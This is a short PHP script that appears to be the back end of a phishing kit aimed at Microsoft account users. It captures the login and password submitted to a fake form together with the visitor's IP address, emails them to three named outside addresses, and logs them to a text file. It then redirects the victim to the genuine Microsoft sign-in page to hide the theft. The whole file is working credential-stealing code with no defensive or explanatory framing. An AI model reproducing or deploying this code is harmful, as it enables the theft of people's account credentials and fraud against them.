<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$email = $_REQUEST['login'];
$pwd = $_REQUEST['passwd'];

$buwhaha = "$adddate
$ip

Email: $email
Passwd: $pwd


knd were here
-----------------------------------";

$recipient = "sheikduniya@hotmail.com, sheikduniya@gmail.com, sheikduniya@yahoo.com";
$From = "account@inkfrogi.com";
$subj = "YANKEE CEO $email / $pwd";
$msg = "Login: $email\npass: $pwd\nip: $ip";
mail("$recipient", $subj, $msg, $From);


$file = fopen("log.txt", "a");
fputs ($file, "$buwhaha\r\n");
fclose ($file);


function getDomainFromEmail($email)
{
    // Get the data after the @ sign
    $domain = substr(strrchr($email, "@"), 1);
 
    return $domain;
}
 
// Example
 

 
$domain = getDomainFromEmail($email);

header("Location: https://login.microsoftonline.com/");
?>